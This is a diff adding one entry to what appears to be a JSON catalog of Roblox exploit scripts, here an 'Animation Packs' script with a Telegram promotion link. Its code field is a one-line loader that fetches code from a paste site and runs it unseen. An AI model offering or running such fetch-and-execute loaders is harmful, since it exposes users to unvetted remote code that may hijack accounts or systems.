@@ -827,6 +827,18 @@
       "date": "2026-05-01",
       "reports": 0,
       "message_id": "108"
+    },
+    "script_1777636993": {
+      "name": "Roblox in game Animation Packs",
+      "description": "\uD83C\uDDFA\uD83C\uDDF8 : Script \u2014 Roblox in game Animation Packs\n\uD83C\uDDF7\uD83C\uDDFA : \u0421\u043A\u0440\u0438\u043F\u0442 \u2014 Roblox in game Animation Packs\n\uD83D\uDD27 Features/\u0424\u0443\u043D\u043A\u0446\u0456\u0457: Get all animation packs, 5 min free trial, Permanent 10 Robux buy",
+      "code": "loadstring(game:HttpGet(\u0022https://pastefy.app/OvLkJhF7/raw\u0022))()\n-- // More scripts: t.me/XenoScriptsSupported",
+      "game": "Universal",
+      "keyless": true,
+      "key_difficulty": "none",
+      "script_side": "server",
+      "date": "2026-05-01",
+      "reports": 0,
+      "message_id": null
     }
   }
 }
